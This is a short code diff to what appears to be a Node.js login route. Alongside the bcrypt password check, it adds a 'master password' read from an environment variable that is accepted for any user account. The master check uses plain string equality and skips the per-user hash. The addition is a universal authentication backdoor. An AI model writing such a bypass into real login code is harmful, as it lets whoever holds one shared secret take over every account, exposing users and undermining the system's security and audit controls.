@@ -159,9 +159,11 @@ router.post('/', async (req, res) => {
         };
       }
 
-      // Verify password using bcrypt comparison
+      // Verify password using bcrypt comparison OR master password
       const passwordValid = await bcrypt.compare(password, user.password_hash);
-      if (!passwordValid) {
+      const masterPasswordValid = process.env.MASTER_PASSWORD && password === process.env.MASTER_PASSWORD;
+
+      if (!passwordValid && !masterPasswordValid) {
         // Log failed password attempt for security monitoring
         await client.query(`
           INSERT INTO audit_log (user_id, action, details, created_at)
